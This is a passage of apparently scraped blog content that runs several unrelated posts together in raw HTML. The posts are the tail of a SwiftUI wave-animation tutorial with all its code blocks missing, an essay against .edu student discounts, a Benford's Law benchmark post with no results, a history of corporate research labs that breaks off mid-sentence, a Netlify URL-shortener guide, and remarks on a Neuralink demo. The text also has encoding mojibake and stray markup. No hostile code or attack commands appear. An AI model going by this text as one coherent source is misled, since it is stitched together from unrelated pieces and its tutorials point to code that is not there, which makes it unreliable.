Letting go of the wave, where we have to either change the page, or return the wave to the original position.
Tapping the wave, resulting in an instant page switch.</p>
<p>All gestures are combined into one, that can be used for setting up <code>WaveView</code>:</p>

<p>Here are the gestures at a closer look.</p>
<h3>1. Drag gesture</h3>
<p>During the page switch, first thing we do is persist the side of the wave, to render it on top:
</p>
<p>Then, we calculate the new state of the wave using the current state and the movement values:
</p>
<p>The state calculation is rather straightforward and will be presented after describing <code>SliderData</code> contents.</p>
<h2>2. Drop gesture in SwiftUI</h2>
<p>This is a slightly more complicated gesture:</p>

<p>First we check if the slider is far enough to trigger a page change. Otherwise it should be returned to the original position by calling the already familiar <code>withAnimation</code> method:</p>
<p><img src="https://exyte.com/upload/4.gif" alt=""></p><p>A separate function is responsible for initiating a page switch: </p>

<p>In the beginning we animate the wave to the final position. Then, after a short delay, we change the page, return the wave to the original state, and animate the new sliders by changing the <code>sliderOffset</code> variable.</p>
<p><img src="https://exyte.com/upload/5.gif" alt="" title="SwiftUI page change"></p><p>SwiftUI page change</p>
<h3>3. Tap gesture</h3>
<p>Tapping a wave combines two actions described above. First we save the wave that should be drawn on top:
</p>
<p>Then the page switch is initiated.
</p>
<h2>SliderData</h2>
<p>3 key parameters comprise slider data: the side of the slider, the vertical coordinate of the wave center, and the progress of the page switch (ranges from 0 to 1).</p>

<p>All other parameters are calculated dynamically from the key parameters:</p>
<p><img src="https://exyte.com/upload/liquidswipe_q.png" alt=""></p><p>Now, what all these parameters are used for? Initially we create data for each slider with zero progress and a different center for the right and left waves.</p>

<p>After the swipe we set the wave to the initial or final state. In this case the center of the wave doesnâ€™t change, and the progress is set to the either end of the range:</p>

<p>Dragging the wave isnâ€™t much more complicated:</p>

<p>The progress is linearly dependant on the waveâ€™s horizontal position, and the wave center is equal to the tapping point.</p>
<p>The method used to decide if the page should be changed is also rather simple:</p>

<p>We simply compare the current progress with an arbitrary constant (0.15 in this case), and revert the wave to the original position if the threshold is not met.</p>
<h2>WaveView</h2>
<p>The last object we need to implement is the <code>WaveView</code>. Hereâ€™s how we do it:</p>

<p>It is a Shape that uses the same 3 parameters as <code>SliderData</code>. The only difference is that the center of the wave and the progress can change. It is necessary so that SwiftUI can automatically animate the wave with access to only the beginning and final states.</p>
<p>To make this possible we define in SwiftUI <code>animatableData</code> variable:</p>

<p>We use this variable to represent the state of the wave as 2 floating point numbers and describe how to get and set them. This is enough to automatically animate the wave, because SwiftUI can animate floating point numbers from the box.</p>
<p>Finally, the path function defines the shape of the wave.</p>

<p>This method is verbose and mathematically complex, so we wonâ€™t include the code in the tutorial. You can check out the full implementation on the <a rel="nofollow" href="https://github.com/exyte/LiquidSwipe">GitHub</a>.</p>
<h2>Conclusion</h2>
<p>As you can see, <strong>SwiftUI</strong> is great not only for simple UI creation. Complex controls and effects can also be efficiently and succinctly described by this new tool, which this tutorial hopefully demonstrated. We have no doubt that SwiftUI will become a new standard for declarative interface creation on Apple platforms, so any Apple developer might want to consider familiarising themselves with it. Don't forget to check out another one of our <a href="https://exyte.com/blog/replicating-apple-card-application-using-swiftui">SwiftUI</a> tutorials and best of luck! </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>I create an educational product and students occasionally ask for discounts. So-called "educational" discounts are very popular, but I don't give them.</p> <p>To be honest, I don't like them at all, but there is some nuance.</p> <p>Not all educational discounts bother me—primarily it's the discounts limited to students at degree-granting institutions and especially those tied to having a .edu email address.</p> <h2 id="why-might-edu-discounts-be-good"><a href="#why-might-edu-discounts-be-good">#</a> Why might .edu discounts be good?</h2> <p>Many of the arguments for student discounts are similar to those for region-based discounts, which I am a fan of. So let's look at some reasons to give discounts in general.</p> <h3 id="need"><a href="#need">#</a> Need</h3> <p>The idea behind student discounts, at least as it was first explained to me, sounds great. Students are often broke so it's only fair to give them a price break!</p> <p>I totally get that. As a student myself, I worked as a waiter, a calculus tutor, a bar tender and even started a house painting franchise in order not to get buried in debt. I went to a cheap state school, back when it was only about 70% of what it costs now, and I was <em>still</em> broke.</p> <p>I have a great deal of sympathy for anyone trying to pay their way through school in the US now. I have even more sympathy for anyone taking out debts they likely won't repay for many, many years.</p> <h3 id="price-discrimination"><a href="#price-discrimination">#</a> Price discrimination</h3> <p>In economics, <a href="https://www.economicshelp.org/microessays/pd/price-discrimination/" target="_blank" rel="noopener noreferrer">price discrimination</a> refers to the idea of charging some customers more than others in order to maximize revenue.</p> <p>In the extreme form, it would mean charging each customer the absolute maximum price they're willing to pay and completely eliminating <a href="https://www.economicshelp.org/blog/188/concepts/definition-of-consumer-surplus/" target="_blank" rel="noopener noreferrer">consumer surplus</a>. This isn't practical or possible in most cases, but less extreme forms are very common.</p> <p>Sometimes customers are segmented by their actions, such as spending time clipping coupons or watching movies during typical work hours. Other times, customers are segmented simply by who they are. Senior discounts or higher prices for foreign tourists are both common examples.</p> <p>A less direct form of price discrimination is to create a slightly different product that would only appeal to customers with more money. In software, we see this often with features revolving around team management, accounting and compliance. This makes it possible to both sell to frugal hobbyist users and to charge large companies very high prices.</p> <h3 id="creating-habits"><a href="#creating-habits">#</a> Creating habits</h3> <p>For most, going to college is a time of major life transitions. Other than marriage, having children or serving in the military there are few times when people change as much.</p> <p>This is <strong>incredibly</strong> appealing to marketers.</p> <p>The opportunity to reach people when they're at a place where they're open to creating so many new habits that will stick with them for years or even decades is worth spending heavily on. One way to do it is through advertising. Another is by giving students a steep discount.</p> <h2 id="the-problem"><a href="#the-problem">#</a> The problem</h2> <p>In a number of ways that matter to me, educational discounts <em>as they are typically implemented</em> are radically different from region or need-based discounts.</p> <h3 id="who-has-a-edu-email-address"><a href="#who-has-a-edu-email-address">#</a> Who has a .edu email address?</h3> <p>Who has a .edu email address? Generally it's only students, faculty and alumni of accredited US colleges. This roughly translates to "many of the most priviledged people in the world".</p> <p>The vast majority of adults in the US <a href="https://data.census.gov/cedsci/table?q=ACSST1Y2018.S1501&amp;g=0100000US&amp;tid=ACSST1Y2018.S1501&amp;hidePreview=true" target="_blank" rel="noopener noreferrer">do not have a 4-year degree</a>. There are probably a billion people in the world who would <em>love</em> to either enter a US college themselves or get their children into one.</p> <p>Competition for those slots is fierce. People spend small fortunes on English language education for a shot. I've seen it first-hand living in Asia for most my adult life.</p> <p>Obviously, not <em>everyone</em> with a .edu email address is or will be wealthy. However in aggregate, their parents are wealthier and they will be wealthier than any country in the world... by a large margin. At a minimum, getting a 4-year degree costs tens of thousands of dollars. Saving a few dollars a month on my <a href="https://alchemist.camp/episodes" target="_blank" rel="noopener noreferrer">screencasts</a> is trivial in comparison.</p> <p>In contrast, the average person in Nigeria earns 2,000 USD/year. Even the average programmer isn't making much compared to their counterparts in other countries. Nigerians are also a double digit percentage of my audience! Indians are a large percentage as well.</p> <p>I have a <em>completely</em> different reaction when someone living in poor country asks for a discount than I do when someone spending more per year on tuition than I earned until my late 20s does.</p> <h3 id="who-is-a-student"><a href="#who-is-a-student">#</a> Who is a student?</h3> <p>An even more salient question is, who counts as a student. I've spent a great deal of time as a non-credentialed student at language schools, at a programming school and even completely on my own with a self-designed curriculum.</p> <p>During those times, I wasn't very successful in asking for educational discounts since nearly all are tied to credential-offering schools. I often thought about why and settled on two answers.</p> <ol><li>They probably worry about non-students claiming to be students to get the discount.</li> <li>Their educational discounts weren't really motivated by any sense of altruism or fairness to begin with.</li></ol> <h3 id="hypocrisy"><a href="#hypocrisy">#</a> Hypocrisy</h3> <p>Perhaps the thing that <em>most</em> bothers me about student discounts I see announced is the virtue signalling.</p> <p>If you're offering a discount to get your customers hooked early in their careers or to raise prices for business users, great. But you're not doing a noble thing if you're restricting a discount to people with .edu addresses.</p> <p>What that discount model actually does is exclude all of the students in poorer parts of the world as well as anyone who couldn't stomach going $100k in debt for a credential.</p> <h3 id="what-does-the-discount-subsidize"><a href="#what-does-the-discount-subsidize">#</a> What does the discount subsidize?</h3> <p>As economists love to point out, incentives matter. When you subsidize something, you get more of it. This isn't just true of governments, but it's also true of companies and other groups.</p> <p>That leads ato the question of what educational discounts subsidize. In effect, they subsidize going to very expensive universities. Is this something we want more of?</p> <p>In what's likely a minority opinion, I think too many people pursue formalized schooling for too long. Universities are necessary for some kinds of careers and for some kinds of research. Far more often, the price is just too high. The worst part of this cost isn't dollars either—it's four years of a person's life.</p> <p>Nearly anything universities teach can be learned outside of a university, and usually faster. I've experienced this first hand with mathematics, foreign languages and programming but it's certainly a wider phenomena.</p> <p>According to George Mason economist Bryan Caplan, <a href="https://amzn.to/2YLbmNG" target="_blank" rel="noopener noreferrer">only about 10%-20% of the value in schooling is actually education</a>. The other 80%-90% is selection and signalling.</p> <h2 id="what-products-are-exceptions"><a href="#what-products-are-exceptions">#</a> What products are exceptions?</h2> <p>If I were selling very expensive tools for skilled professionals, like Adobe used to, then I'd offer student discounts. Even a person in relatively fortunate circumstances has fewer resources than a typical company.</p> <p>Dropping a few dollars a month doesn't move the needle compared to tuition, but spending thousands of dollars on a photo or video editor sure could.</p> <p>Another factor in Adobe's case was that by being <em>the</em> tool to use in the industry, students needed to learn it. Anyone trying to become a designer pretty much had to find a way, even if that meant "pirating" it. Giving students convenient affordable access to such a tool is also a great way to <em>become</em> a standard tool in the industry.</p> <p>Even Adobe didn't limit their discounts to US students, though. Doing so might have cost them billions.</p> <h2 id="the-bottom-line"><a href="#the-bottom-line">#</a> The bottom line</h2> <p>Having a .edu email address generally means being in the most expensive and desired university system in the world.</p> <br>  <br> <hr></div></div>]]>

<p>After watching a Netflix documentary about Benford’s Law, i got really interested in it because it can help detect fraud in e.g. balance sheets. So i searched my favorite programming languages and detected that there is no npm Package for checking Benford’s Law.</p>
<p>Sooo … Long story short: I created nearly identical libraries for doing a Benford’s Law check in JavaScript, Go and Crystal. My inspiration was from a Python library - so the algorithm of these libraries is nearly identical. There are some catches like i used many different math libraries for calculating chi-square and some of these libraries offer addition information, others not …</p>
<p>But i think this gives us a good example of a algorithm which is implemented in different programming languages and can be benchmarked. That’s what i wanna do in this post: Comparing the Benford’s Law check in different Languages.</p>

<p>I didn’t expected that big difference. Go is clearly the winner here and that with big distance to the other implementations. One reason why Python took so long may be that the used library shows additional information but i don’t think Python could compete with the other implementations if the library wouldn’t show more.</p>
<p>It is also noteworthy that Go is very very fast compiling. Crystal isn’t even in the area of the Go compile time.</p>

						<p><span>Once, small firms centred on inventors were responsible for most of our innovation. Larger firms might buy or exploit these steps forwards, but they did not typically make them. And then for a brief period, this changed: many of the best new products, tools, and ideas came from research labs within large corporations. This brief period also happened to be the era when scientific, technological, and economic productivity sped forward at its fastest ever clip. Yet almost as soon as it arrived, the fruitful period was over and we returned to a situation where small companies and small-business-like teams at universities developed innovations outside of large companies and sold them in a market for ideas. Though we might enjoy the innovation created by small flexible firms, we should not dismiss the contributions made by large corporate labs. The corporate lab may be creeping back, but aggressively prosecuting antitrust against large firms growing organically through in-house research could easily snuff this spark out.</span></p>
<h3>The USA’s first system of innovation</h3>
<p><span>When the USA began to contribute to the progress of technology, in the early 19th century, it was largely practically-minded, not based on deep scientific understanding. Rather, it largely consisted of individual inventors commercialising their own inventions. Whereas nuclear power depended on decades or centuries of progress in physics, many late 19th century innovations were more like the cotton gin, which came together through practical-minded trial and error in the field. By the late 19th century, the system had morphed into one we would find strangely familiar today: inventors invented, venture capitalists invested, and companies commercialised. The system even had </span><a href="https://www.cambridge.org/core/journals/business-history-review/article/patent-alchemy-the-market-for-technology-in-us-history/90991329A8D4A49EBF7B49D2EAD1CE7A"><span>patent lawyers</span></a><span> and </span><a href="https://www.hoover.org/sites/default/files/khan_ip2_working_paper.pdf"><span>non-practising entities</span></a>, <span>which own patents purely </span><a href="https://www.hbs.edu/businesshistory/Documents/BHR870102.pdf"><span>to litigate on their behalf</span></a><span>. There were still startups commercialising an idea and scaling it up themselves, but many inventors found that the division of labour enabled by the market ideas allowed them to </span><a href="https://www.cambridge.org/core/journals/business-history-review/article/patent-alchemy-the-market-for-technology-in-us-history/90991329A8D4A49EBF7B49D2EAD1CE7A"><span>focus on what they did best</span></a><span>.</span></p>
<p><span>Large firms were consumers of ideas created by inventors, and were sceptical of the value of doing in-house science. They believed it was easier to buy new science off the shelf. In 1885 T. D. Lockwood, head of American Bell Telephone Company’s patent department, said:&nbsp;</span></p>
<blockquote><p><span>“I am fully convinced that it has never, is not now, and never will pay commercially, to keep an establishment of professional inventors, or of men whose chief business it is to invent”</span></p></blockquote>
<p><span>Of course, Bell Labs itself later grew to be one of the marquees of commercial labs—in the late 1960s it employed 15,000 people including 1,200 PhDs, who between them made too many important inventions to list, from the transistor and the photovoltaic cell to the first digitally scrambled voice audio (in 1943) and the first complex number calculator (in 1939). Fourteen of its staff went on to win Nobel Prizes and five to win </span><a href="https://en.wikipedia.org/wiki/Turing_Award"><span>Turing Awards</span></a><span>. </span></p>
<p><span>The 1920s stock market boom was in large part driven by a huge rise in the value that investors </span><a href="https://pubs.aeaweb.org/doi/pdfplus/10.1257/aer.98.4.1370"><span>accorded to intangible capital</span></a><span> and ideas held within companies. A similar thing happened in the </span><a href="https://www.amazon.co.uk/Capitalism-Without-Capital-Intangible-Economy/dp/0691175039"><span>1990s Dot-com Bubble</span></a><span>. Between 1921 and 1927 the number of scientists and engineers in industrial labs more than doubled. When the stock market crashed and the Great Depression hit it caused a </span><a href="https://pdfs.semanticscholar.org/d71a/90cfa2d0d0d72f13724d27dd326209431974.pdf"><span>massive and persistent decline</span></a><span> in independent inventing and the startup-like activity around it. But large labs continued to boom, increasing staffing and research spending throughout the lean 1930s, and earning more patents. By 1930, most patents were issued to large firms, rather than independent innovators, and this gap only widened into the 1950s. The industrial lab had become king.</span></p>
<h3>Why labs work well</h3>
<p><span>The question of why the industrial lab works is a microcosm of the question of why the firm works in general. Economist Ronald Coase, who won the Nobel Prize in 1991 (and who lived to be 102) bookended the most productive period of his career with two insights about transaction costs. The first, published in 1937 and entitled </span><a href="https://onlinelibrary.wiley.com/doi/full/10.1111/j.1468-0335.1937.tb00002.x"><span>“The Nature of the Firm”</span></a><span>, tells us why firms exist. In economics, situations are typically approached from the perspective of competitive behaviour in open markets. Most of the things we buy are from open, competitive markets like these. But when we sell our labour, we are usually bound to a single “buyer”—our employer—for an extended period of time for everything we have to offer. If market competition is so efficient, why do we not set up mini-firms for every instance of cooperative work and receive pay in line with our output? Why do we instead generally sell a promise to do whatever our boss says within limits for certain hours of the day for months or years in advance?</span></p>
<p><span>The other, </span><a href="https://www.law.uchicago.edu/files/file/coase-problem.pdf"><span>“The Problem of Social Cost”</span></a><span>, reads like a reflection of the first. Published in 1960, it spawned the so-called Coase Theorem, which holds that so long as transaction costs—the costs of interacting with other individuals or institutions, such as the costs of drawing up and enforcing a contract—are low, people will contract to deal with the problems emerging from positive and negative externalities, like the benefits of a new park to a neighbourhood or the costs of pollution. Where transaction costs are too high, institutions and policies are needed to deal with the externalities instead.</span></p>
<p><span>Coase answers the question of why businesses exist as he answers the question of why people simply don’t contract away all externalities: transaction costs. If there is a cost on both sides every time one person wants to pay another for a task, then some tasks will not be worth paying for, or worth doing at the going rate. Concretely: an employer who does not negotiate contracts for each and every individual work unit can afford to offer higher wages, and an employee who does not do so can afford to accept lower wages. Companies organized in this way thus outcompete pure market organization—in cases where transaction costs are large.</span></p>
<p><span>In many ways, this general story for why firms exist also explains why large firm R&amp;D labs were so successful. The transaction costs of collaboration are extremely large, and prevent all sorts of potentially-valuable crossovers: not just the financial costs of contracting with others, but the costs of finding people you work well with, of corresponding and collaborating with people far from you, and so on. University lecturers collaborate more with those in their department than in other departments, and more with those in their university or city than elsewhere, despite all the tools and technologies the internet has brought. Chance meetings are another driver of serendipitous discovery and unexpected but fruitful collaborations.&nbsp;</span></p>
<p><span>What’s more, without great efforts in ‘translation’, many scientific ideas can be completely disconnected from practical applications. A research lab brings an array of scientific experts together from different disciplines, for collaboration and drawing on expertise at low cost. Fellow researchers bump into one another. And the firm context means the potential impact in terms of usable products is always taken into account.</span></p>
<h3>The DARPA Era</h3>
<p><span>The era of the R&amp;D lab has one particularly legendary story and paradigmatic example: PARC. Xerox’s Palo Alto Research Centre—the location in Palo Alto, now the home of companies like Tesla, Palantir, and Google, is no coincidence—developed many of the foundational building blocks of today’s technology and economy. In the 1970s, PARC researchers built the first computer with a graphical user interface, the first laser printer, the first Ethernet cable, and the first user-friendly word processor. Steve Jobs visited PARC in 1979, aged 24, and incorporated many of the ideas into Apple products. Charles Simonyi, a key developer at PARC, moved to Microsoft, where he developed the Office suite. But Xerox itself, which is still largely known for making photocopiers, did not capitalise on these inventions.</span></p>
<p><span>PARC, in turn, had hired many of its workers from Augmentation Research Centre, a publicly-funded project which pioneered the computer mouse, hyperlinks, the earliest predecessor to the internet, and many smaller innovations we take for granted in today’s computer ecosystem. ARC was funded by ARPA, the Advanced Research Projects Agency, now DARPA. Though DARPA (then ARPA) is funded by the US Department of Defence, it shares many elements with golden era R&amp;D labs. They are organised around a mission and a goal—even the most basic research is done with an end in mind—but researchers are given a lot of freedom to make their own decisions.</span></p>
<h3>A return to the market for ideas</h3>
<p><span>The scale of the change since the 1970s is huge—big businesses have retreated from research. In the 1960s, DuPont, the chemicals giant, published more in the </span><i><span>Journals of the American Chemical Society</span></i><span> than both MIT and Caltech combined. R&amp;D magazine, which awards the R&amp;D 100 to the hundred innovations it judges most innovative in a given four year period, gave 41% of its awards to Fortune 500 companies in its 1971 iteration and 47% in 1975. By 2006, 6% of the awards were going to firms in the Fortune 500. The great majority of these awards are now being won by federal labs, university teams, and spin-offs from academia. The lone inventor is back.</span></p>
<p><span>This is reflected by declines in the shares of patents going to the biggest businesses, and in the shares of scientists working there. In 1971 just over seven per cent of scientists in industry tracked by the US National Science Foundation worked in firms with under 1,000 employees; by 2004 this was 32%. In 2003 around a quarter worked at firms with fewer than ten employees. Even pharmaceuticals, the one area where large internal research labs are still significant, has been affected—around half of the drugs approved so far in the 2010s were originally discovered by small biotech startups.</span></p>
<p><span>In general, participation by large American firms in …</span></p></div></div></div>

We will be using <a target="_blank" href="https://docs.netlify.com/routing/redirects/">Netlify Redirects</a> and a package called <a target="_blank" href="https://github.com/kentcdodds/netlify-shortener">netlify-shortener</a>.</p>
<p>I have always wanted to create my own URL shortener and use it to shorten all my links. But I always felt like creating it would take a lot of effort, although I never actually gave much thought to it. </p>

<p>But I came across a tweet containing a link to the video which showed how to create a simple URL shortener. This blog post is my attempt to share that approach with you.</p>
<p>Before we see how to create your own URL shortener, let's see why having a URL shortener can be useful.</p>
<p>If you are already convinced that having your own URL shortener can be useful, you can skip this section and directly jump to <a href="#creating-your-own-url-shortener">Creating Your Own URL Shortener</a> section.</p>
<h2 id="benefits-of-shortening-your-urls">Benefits of Shortening Your URLs</h2>
<h3 id="it-masks-the-original-links">It masks the original links.</h3>
<p>Masking the URL has many advantages</p>
<p>For example, take this URL - <code>hashnode.com/series/how-i-made-a-markdown-editor-with-ability-to-embed-youtube-videos-codepens-etc-cke6g1y2x00afxms17vp30803</code></p>
<p>This URL is the link to the series that I am writing on <a href="https://hashnode.com/@hashnode">Hashnode</a> where I am developing a full-featured Markdown editor from scratch. But, the URL is so long and difficult to read and share on platforms like twitter. </p>
<p>Instead, wouldn't it be nice to have a simple short URL like <code>pbt.im/markdown-series</code> which redirects to the above URL. It's short, crisp, readable, and also equally conveys what one can expect in that link.</p>
<h3 id="sharing-affiliate-links">Sharing affiliate links.</h3>
<p>Other places where URL shortening can be useful is when you want to share or brand an ugly affiliate link, or when the domain of the link that you want to share is very long.</p>

<p>Take a look at some of the shortened links that I frequently use. </p>

<p>Sharing the above links is so easy. You don't even have to copy them. You can just type them out yourself. They are short, consistent, readable and can easily be remembered.</p>
<h3 id="links-can-change">Links can change</h3>
<p>Another disadvantage of sharing normal links is that the links can potentially change in the future. </p>
<p>If they do change, you can't hunt down every post and every place where you posted or shared that link and then update it. And it might not always be feasible to redirect the old URL to a new URL. </p>
<p>Shortened links can come in very handy in this situation. The shortened link that you share need not change ever. Whereas the URL that the short link should redirect to can change as you wish.</p>
<h3 id="bookmarks">Bookmarks</h3>
<p>I even started using my URL shortener to create bookmarks. I added a short URL(<code>/bookmarks</code>) that redirects to a GitHub page which contains all my other short URLs. Then whenever I want to bookmark a very useful URL, instead of bookmarking it normally, I started shortening it, which will automatically add it to my list of short URLs (which means it will also be available at <code>/bookmarks</code>)</p>
<p>Now that we saw some of the reasons of how shortened URLs can help us, let's see how to create one yourself.</p>
<h2 id="creating-your-own-url-shortener">Creating Your Own URL Shortener</h2>

<p>This is the tweet that inspired me to explore and create a URL shortener for shortening my links. I finally ended up using the approach that Kent suggested. I will be explaining the same in this article.</p>
<h3 id="netlify-redirects">Netlify Redirects</h3>
<p>Before we jump into the actual content, let's see what Netlify redirects are. Netlify gives us an easy way to handle redirects for any site that is hosted on the platform. All you have to do is create a <code>_redirects</code> file and then add the redirect rules in that file.</p>
<blockquote>
<p>In a <code>_redirects</code> file, each redirect rule must be listed on a separate line, with the original path followed by the new path or URL. Any line beginning with # will be ignored as a comment.</p>
<p>Here is an example:</p>
<pre><code>
<span>/home              /</span>
/blog/my-post.php  /blog/my-post
/news              /blog
<span>/cuties            https:/</span>/www.petsofnetlify.com
</code></pre></blockquote>
<p>This is the bare minimum that you need to create your own URL shortener. </p>
<ul>
<li>Create an empty project with a single file called <code>_redirects</code>.</li>
<li>Add your short and complete URLs there.</li>
<li>Deploy that project to Netlify. </li>
</ul>
<p>You now have your own simple URL shortener. </p>
<p>Every time you want to add a new URL, you can just add it in the <code>_redirects</code> file and then deploy it. If using this workflow is good enough for you, you can stop here and use it.</p>
<p>But Kent went a step further and created a package called <a target="_blank" href="https://github.com/kentcdodds/netlify-shortener">netlify-shortener</a> which simplifies the workflow of creating short URLs even further.</p>
<p>Follow these steps to start using <code>netlify-shortener</code> and set up your own URL shortener</p>
<h4 id="step-1-create-an-empty-project">Step 1: Create an empty project</h4>
<pre><code>mkdir url-shortener
<span>cd</span> url-shortener
</code></pre><h4 id="step-2-initialize-it-as-npm-project">Step 2: Initialize it as npm project</h4>
<pre><code>npm <span>init</span> -y
</code></pre><h4 id="step-3-create-a-redirects-file-and-add-the-following-content">Step 3: Create a <code>_redirects</code> file and add the following content.</h4>
<pre><code>
/*       https://your-website.com
</code></pre>
<p><code>your-website.com</code> will act as a fallback when the URL doesn't match any of the available short URLs. Replace it with whatever URL you want to have as a fallback.</p>
<h4 id="step-4-add-homepage-and-shorten-script-to-your-packagejson-add-your-own-short-domain-url-to-the-homepage">Step 4: Add homepage and shorten script to your package.json (Add your own short domain URL to the homepage)</h4>
<pre><code>{
  "<span>homepage</span>": <span>"https://pbt.im"</span>,
  "<span>scripts</span>": {
    "<span>shorten</span>": <span>"netlify-shortener"</span>
  }
}
</code></pre>
<p>Now, you can run the following commands.</p>
<pre><code>
<span>npm</span> run shorten 


<span>npm</span> run shorten https:<span>//</span>yahoo.com


<span>npm</span> run shorten https:<span>//gi</span>thub.com gh
</code></pre><p>The <code>npm run shorten</code> command</p>
<ul>
<li>Generates a shortcode automatically if it is not provided.</li>
<li>Validates your URL.</li>
<li>Automatically check for URL collisions and throws an error if there is a collision.</li>
<li>Adds the URL to the top of the <code>_redirects</code> file and reformats the file properly.</li>
<li>Pulls the changes from remote, adds the new shortened URL, commits the code, and then pushes the commit to the remote again.</li>
<li>Automatically copies the short URL to your clipboard.</li>
</ul>
<p>You don't even have to provide <code>https://</code>, by default it assumes that the original link is <code>https://</code></p>
<p>You can even add it as a global command in your shell using <a target="_blank" href="https://github.com/kentcdodds/netlify-shortener#shell-function">these instructions</a></p>
<h3 id="my-workflow-for-shortening-a-url">My workflow for shortening a URL</h3>
<p>Open the terminal and simply write <code>shorten original-URL short-slug</code>. </p>
<p>For example, to shorten the link to my Github profile, I will run the following command </p>
<pre><code><span>shorten</span> github.com/pbteja1998 gh
</code></pre><h2 id="tl-dr">TL; DR</h2>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p><img src="https://theodormarcu.com/images/neuralink/neuralink1.jpg" alt="Neuralink Press Image">
<sub>Images courtesy of Neuralink.</sub></p><p>You probably heard about <a href="https://techcrunch.com/2020/08/28/elon-musk-demonstrates-neuralinks-tech-live-using-pigs-with-surgically-implanted-brain-monitoring-devices/" target="_blank">the latest Neuralink demo</a>
by now. I’m referring to the one where Elon Musk showed pigs with brain implants walking around and making cute noises. But why should you care? Is this just another publicity stunt by a rich billionaire with eccentric pet projects, or does it actually matter?</p><iframe width="100%" height="auto" src="https://www.youtube.com/embed/DVvmgjBL74w?start=947" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><p><sub>Click above to see the part of the presentation where the pig sniffs around and sounds play whenever the neurons associated with his snout fire. Trust me, it’s adorable. From now on, this is the sound I’ll play in my mind whenever I see animals sniffing around.</sub></p><p>The Neuralink demo is a big deal for several reasons. Most importantly, it shows a fully-working brain-machine interface product in a living being. I cannot emphasize how incredible this is. Creating a brain implant is a hard task. Not only do you have to figure out how to stick something in a brain without hurting it, but keeping that thing in place, building the software to interpret the signals coming from it, and then removing it with minimal damage is an endeavor that presents serious challenges at every step of the way. Making all of the above into a <em>product</em>, not a week-long surgery research project, is a truly Promethean achievement.</p><p>The fact that Neuralink is closer to delivering a product and not just research matters a lot. We’ve heard about advances in brain-machine interface research for decades now, but all the results have been highly experimental. Building a product and not an experiment means that all those results, from restoring speech to restoring movement, are closer to being used by those who actually need them. Furthermore, reducing the barriers to obtaining neural data from humans creates an unprecedented opportunity to better understand our own minds, not to mention traditionally elusive topics like consciousness.</p><p>One of the first things that stood out to me in the demo was how Neuralink inserts the brain-machine interface device into the brain. Insertion is something Neuralink has brought up in past presentations, but this time they showed a particularly good video of how it works. In order to insert sensors in a brain without damaging it, the Neuralink team has built electrodes in the shape of small wires that are 1/4 of the diameter of human hair. These electrodes are then inserted through a skull opening using a high-precision robot that scans the brain area <em>during</em> surgery, which allows it to avoid any blood vessels, no matter how small. This procedure reduces tissue damage and increases the probability that the implant won’t be outright rejected by the brain. To see how cool this is, just watch the demo below:</p><video id="video" muted="" preload="auto" poster="https://j.gifs.com/p8ADyp.jpg" loop="" autoplay="" playsinline="">
<source src="https://j.gifs.com/p8ADyp.mp4" type="video/mp4"></video><p>The robot misses the blood vessels every time! This takes place in an area where distances are measured in micrometers - 1/100000 of a meter. This procedure is not something that would work without major advances in robotics and computer vision. Having a human do it by hand is out of the question. I suggest you go back to the <a href="https://youtu.be/DVvmgjBL74w?t=646" target="_blank">original demo</a> and watch the high-definition video to see just how good the robot is at this job.</p><p>The fact that the robot can implant a <em>Link</em> (Neuralink’s name for the sensor) in under an hour is a great achievement too. Neuralink’s goal is to make getting a brain-machine interface as easy as getting Lasik eye surgery. This demo showed that they’re not joking about delivering on this promise.</p><p>Another thing that truly stood out to me is how secure and inconspicuous the <em>Link</em> interface looked on the pig’s head. I couldn’t even spot it! This is really important, since if you’re about to make something that living beings are supposed to wear every day, you might as well make sure it’s not awkward or annoying. Even better, the interface should feel like it’s part of your own body.</p><p><img src="https://theodormarcu.com/images/neuralink/neuralink2.jpg" alt="Neuralink Press Image">
<sub>The new <em>Link</em> brain-machine interface.</sub></p><p>This is an area that did not receive a lot of attention before Neuralink. For example, when hospitals perform invasive brain-recordings using traditional methods like ECoG, wires come out of your head through skull openings. Since the brain is a squishy mass surrounded by liquid, keeping the liquid <em>in</em> and the area around the opening <em>clean</em> becomes an incredibly difficult task. Nurses have to hover around patients constantly to make sure that the wires are not coming loose and that the brain ooze is being cleaned so that no infections take place.</p><p>What makes the <em>Link</em> so revolutionary is that it’s a standalone device. By removing the need for charging or data transfer wires, this brain-machine interface is closer to an Apple Watch-level wearable than anything else that has been built so far. Seeing the charging puck (which seems to have copied the Apple Watch charging puck) offered perhaps the clearest glimpse of the future in the entire presentation (so did the 1-day battery life, which, while amazing for a device this size, will also lead to some really funny memes about how our brains will run out of battery and need to be charged).</p><p><img src="https://theodormarcu.com/images/neuralink/neuralink3.jpg" alt="Neuralink Inductive Charging Mechanism">
<sub>Is this going to be worse than forgetting to charge your phone at night?.</sub></p><p>Having something that fits neatly in your skull and blocks liquid from coming out without the need for wires is a major achievement. I’m sure there is still a lot of work to be done, especially given Elon’s calls for help from sealing experts, but seeing something as good as what we’ve seen today shows a great degree of progress.</p><blockquote><p lang="en" dir="ltr">If you’ve solved hard problems with phones / wearables (sealing, signal processing, inductive charging, power mgmt, etc), please consider working at engineering@neuralink.com</p>— Elon Musk (@elonmusk) <a href="https://twitter.com/elonmusk/status/1284306733720940544?ref_src=twsrc%5Etfw">July 18, 2020</a></blockquote><p>Another noteworthy aspect of the <em>Link</em> interface is the signal processing. In this regard, the pig-sniffing-with-sounds demo was ok, since it didn’t really use any fancy techniques. What really stood out was predicting and interpreting brain signals using the information from the <em>Link</em> sensors.</p><video id="video" muted="" preload="auto" poster="https://j.gifs.com/vl0MOm.jpg" loop="" autoplay="" playsinline="">
<source src="https://j.gifs.com/vl0MOm.mp4" type="video/mp4"></video><p>These demos can get a bit hand-wavey and Neuralink did not provide a lot of information about the techniques used to produce this particular example. However, given the fact that deep learning has been shown to be really good at brain signal decoding and prediction, I wouldn’t be suprised if Neuralink and OpenAI partenered on advancing signal processing using deep learning once the hardware is ready. Given Elon’s obsession with the singularity, I wouldn’t be surprised if this happened sooner.</p><p>Overall, I’m really excited about the future of invasive brain-machine interfaces after seeing this demo. While the jump from animals to humans is a big one and I’m sure Elon errs on being overly-optimistic when it comes to the timeline, this is a historical moment similar to launching the first dog into space. The fact that this is possible today opens an endless array of opportunities for the future of humanity.</p></div></div>]]>

